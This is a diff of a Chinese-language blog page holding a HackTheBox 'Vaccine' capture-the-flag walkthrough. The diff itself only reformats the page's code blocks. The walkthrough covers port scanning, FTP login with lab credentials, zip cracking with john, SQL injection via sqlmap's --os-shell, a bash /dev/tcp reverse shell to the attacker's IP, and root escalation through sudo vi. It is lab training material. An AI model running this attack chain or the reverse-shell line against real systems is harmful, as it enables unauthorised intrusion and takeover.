@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="实验环境 信息收集端口扫描： 1nmap -sC -sV 10.10.10.46   看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码  因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录 1ftpuser&#x2F;mc@F1l3ZilL4   直接输入上一题中获得的用户名和密码可以成功登录  可以看到有一个备份文件，我们先下载下来，但是这个文件需要">
+    <meta name="description" content="实验环境 信息收集端口扫描： nmap -sC -sV 10.10.10.46   看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码  因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录 ftpuser&#x2F;mc@F1l3ZilL4   直接输入上一题中获得的用户名和密码可以成功登录  可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-Vaccine">
 <meta property="og:url" content="http://example.com/2021/07/13/HackTheBox-Vaccine/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="实验环境 信息收集端口扫描： 1nmap -sC -sV 10.10.10.46   看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码  因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录 1ftpuser&#x2F;mc@F1l3ZilL4   直接输入上一题中获得的用户名和密码可以成功登录  可以看到有一个备份文件，我们先下载下来，但是这个文件需要">
+<meta property="og:description" content="实验环境 信息收集端口扫描： nmap -sC -sV 10.10.10.46   看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码  因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录 ftpuser&#x2F;mc@F1l3ZilL4   直接输入上一题中获得的用户名和密码可以成功登录  可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png">
 <meta property="og:image" content="https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png">
@@ -183,22 +183,25 @@
   <div class="content" itemprop="articleBody">
     <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png" alt="Screenshot_2021-08-04_09_35_14"></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.10.46</span><br></pre></td></tr></table></figure>
-
+<pre><code>nmap -sC -sV 10.10.10.46
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png" alt="Screenshot_2021-08-02_11_35_34"></p>
 <p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p>
 <p><img src="https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png" alt="Screenshot_2021-08-02_11_38_54"></p>
 <p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftpuser/mc@F1l3ZilL4</span><br></pre></td></tr></table></figure>
-
+<pre><code>ftpuser/mc@F1l3ZilL4
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png" alt="Screenshot_2021-08-02_11_40_03"></p>
 <p>直接输入上一题中获得的用户名和密码可以成功登录</p>
 <p><img src="https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png" alt="Screenshot_2021-08-02_11_40_34"></p>
 <p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p>
 <p><img src="https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png" alt="Screenshot_2021-08-02_11_40_55"></p>
 <p>我们直接使用john来爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip2john backup.zip &gt; hash</span><br><span class="line">john hash</span><br><span class="line">#因为我已经爆破过一次，所以可以直接show输出</span><br><span class="line">john hash --show</span><br></pre></td></tr></table></figure>
-
+<pre><code>zip2john backup.zip &gt; hash
+john hash
+#因为我已经爆破过一次，所以可以直接show输出
+john hash --show
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png" alt="Screenshot_2021-08-02_11_47_56"></p>
 <p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p>
 <p><img src="https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png" alt="Screenshot_2021-08-02_11_48_29"></p>
@@ -209,19 +212,19 @@
 <h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p>
 <p><img src="https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png" alt="Screenshot_2021-08-02_14_15_53"></p>
 <p>那就直接用sqlmap跑，注意cookie要改成自己的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png" alt="Screenshot_2021-08-03_09_22_43"></p>
 <p><img src="https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png" alt="Screenshot_2021-08-03_09_26_33"></p>
 <p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell</span><br></pre></td></tr></table></figure>
-
+<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png" alt="Screenshot_2021-08-03_09_27_03"></p>
 <p>接下来反弹shell，开启一个监听端口</p>
 <p><img src="https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png" alt="Screenshot_2021-08-03_09_27_50"></p>
 <p>在sqlmap的shell中输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
-
+<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#39;
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png" alt="Screenshot_2021-08-03_09_28_01"></p>
 <p>成功接收到反弹的shell</p>
 <p><img src="https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png" alt="Screenshot_2021-08-03_09_28_19"></p>
@@ -229,16 +232,18 @@
 <p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p>
 <p><img src="https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png" alt="Screenshot_2021-08-03_09_31_35"></p>
 <p>接下来先得到交互式的shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#看别的walkthrough说是两个都可以，但是我用第一个不行</span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code>#看别的walkthrough说是两个都可以，但是我用第一个不行
+SHELL=/bin/bash script -q /dev/null
+python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+</code></pre>
 <p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br></pre></td></tr></table></figure>
-
+<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png" alt="Screenshot_2021-08-03_09_33_34"></p>
 <p><img src="https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png" alt="Screenshot_2021-08-03_09_34_36"></p>
 <p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
-
+<pre><code>:!/bin/bash
+</code></pre>
 <p><img src="https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png" alt="Screenshot_2021-08-03_09_35_30"></p>
 <p>最后就可以读取root的flag了</p>
 <p><img src="https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png" alt="Screenshot_2021-08-03_09_36_08"></p>
